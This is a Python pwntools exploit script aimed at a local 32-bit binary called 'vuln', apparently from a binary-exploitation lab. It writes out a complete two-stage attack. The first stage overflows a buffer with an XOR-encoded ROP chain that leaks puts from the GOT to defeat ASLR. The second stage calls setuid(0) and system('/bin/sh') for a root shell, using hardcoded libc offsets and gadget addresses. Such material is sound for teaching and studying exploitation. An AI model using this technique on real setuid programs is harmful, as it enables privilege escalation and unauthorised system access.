#!/usr/bin/python

from pwn import *
import posix
import os

def main():

	# Get absolute path to vuln 
	vuln_path = os.path.abspath("./vuln")
	log.info("Absolute path: %s" % vuln_path)
	
	# Change working dir to tmp and create a named pipe badfile.
	# This is to avoid problems with the shared directory in vagrant
	os.chdir("/tmp")
	log.info("Changed dir to /tmp")

	# Create named pipe to interact realiably with binary
	np = "badfile" # np - named pipe
	try: # The try block lets you test a block of code for errors.
		os.unlink(np)
	except: # The except block lets you handle the error.
		pass
	os.mkfifo(np) # Creates the named pipe
	
	# Starts process:
	# Once at /tmp , program will remain open until it receives an input
	p = process(vuln_path)
	
	# Open a handle to the `input` named pipe
	comm = open(np, 'w', 0) # `w` : writing ,  `0` : stdin

	# 0804a014  00000307 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	puts_got = 0x0804a014
	
	# call   0x8048380 <puts@plt>
	puts_plt = 0x8048380

	# objdump -d /lib32/libc-2.23.so | grep "<__libc_system@@GLIBC_PRIVATE>"
	# 0003a940 <__libc_system@@GLIBC_PRIVATE>:
	system_offset = 0x0003a940

	# objdump -d /lib32/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>"
        # 0005f140 <_IO_puts@@GLIBC_2.0>:
        puts_offset = 0x0005f140

	# objdump -d /lib32/libc-2.23.so | grep "<exit@@GLIBC_2.0>:"
	# 0002e7b0 <exit@@GLIBC_2.0>:
	exit_offset = 0x0002e7b0	

	# strings -a -tx /lib32/libc-2.23.so |grep "/bin/sh"
        # 15902b /bin/sh
	bin_sh_offset = 0x15902b

	# objdump -d /lib32/libc-2.23.so |grep "<setuid@@GLIBC_2.0>:"
	# 000b0060 <setuid@@GLIBC_2.0>:
	setuid_offset = 0x000b0060

	# 0x08048345 : pop ebx ; ret
	pr = 0x08048345

	#    0x08048530 <+10>:	push   ebp
	main_addr = 0x08048530
	
	# Craft payload
	xor_str = 0xBE
	offset = 24

	# Gadget: leak
	leak = p32(puts_plt)
	leak += p32(main_addr)
	leak += p32(puts_got)
	
	payload_1 = "A" * offset
	payload_1 += leak

	# Fills in gaps in the buffer with NOP	
	payload_1 = payload_1.ljust(52, '\x90')
	payload_1 = xor(payload_1, xor_str) # Encodes payload	

	comm.write(payload_1) # Writes to the named pipe	
	log.info("Stage 1 sent!")

	# Get the leaked address of puts in libc
	leak = p.recv(4) # Only receives 4 bytes which is the leaked address
	puts_addr = u32(leak) # Unpacks raw bytes into a 32bit integer value
	log.success("puts addr: 0x%x" % puts_addr)
	p.clean() # Removes all the buffered data from a tube

	# Calculate libc base address
	libc_base_addr = puts_addr - puts_offset
	log.success("libc base : 0x%x" % libc_base_addr)
	
	# Calculates system() addr
	system_addr = libc_base_addr + system_offset
	log.success("system addr : 0x%x" % system_addr)

	# Calcualtes exit() addr
	exit_addr = libc_base_addr + exit_offset
	log.success("exit addr : 0x%x" % exit_addr)
	
	# Calculates setuid() addr
	setuid_addr = libc_base_addr + setuid_offset
	log.success("setuid addr: 0x%x" % setuid_addr)

	# Calculate /bin/sh addr
	bin_sh_addr = libc_base_addr + bin_sh_offset
	log.success("/bin/sh addr : 0x%x" % bin_sh_addr)

	# Gadget : setuid + shell
	shell = p32(setuid_addr)
	shell += p32(pr)
	shell += p32(0x0)
	shell += p32(system_addr)
	shell += p32(exit_addr)
	shell += p32(bin_sh_addr)

	payload_2 = "A" * offset
        payload_2 += shell

        # Fills in gaps in the buffer with NOP  
	payload_2 = payload_2.ljust(52,'\x90')
        payload_2 = xor(payload_2, xor_str) # Encodes payload 

	comm.write(payload_2) # Writes to the named pipe        
        log.info("Stage 2 sent!")
	
	# Pass control of program back to user
	p.interactive()

if __name__ == "__main__":
	main()
